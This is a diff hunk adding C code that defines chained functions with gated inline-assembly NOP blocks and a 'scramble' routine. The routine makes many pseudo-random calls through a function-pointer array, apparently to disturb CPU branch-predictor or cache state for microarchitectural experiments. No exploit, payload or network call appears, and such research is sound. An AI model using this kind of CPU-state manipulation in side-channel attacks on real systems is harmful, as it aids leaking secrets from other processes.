@@ -22,6 +22,1815 @@
 #include "instr.h"
 #include "utils.h"
 
+// 4096 works, 8192 and 1024 do not.
+static int __gate = 0;
+static void s1(void) { if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+static void s2(void) { s1(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+static void s3(void) { s2(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+static void s4(void) { s3(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+static void s5(void) { s4(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+static void s6(void) { s5(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+static void s7(void) { s6(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+static void s8(void) { s7(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
+
+static inline int next(void) {
+  static int rng[] = { 1, 4, 5, 6, 1, 2, 4, 7, 1, 3, 5, 11, 10, 8, 1, 9, 3, 6, 3, 3, 5, 6, 11, 3, 1, 2, 3, 2, 2, 4, 4 };
+  static int ip;
+
+  int i = rng[ip++];
+  if (ip == sizeof(rng) / sizeof(int)) {
+    ip = 0;
+  }
+  return i;
+}
+
+static void scramble(void) {
+  void (*fp[])(void) = { s1, s2, s3, s4, s5, s6, s7, s8, s1, s2, s3, s4, s5, s6, s7, s8, s1, s2, s3, s4, s5, s6, s7, s8, s1, s2, s3, s4, s5, s6, s7, s8 };
+  void (*f)(void);
+  static int gate = 0;
+
+  for (int i = 0; i < (1 << next()) + 57; i++) {
+    f = fp[next()];
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
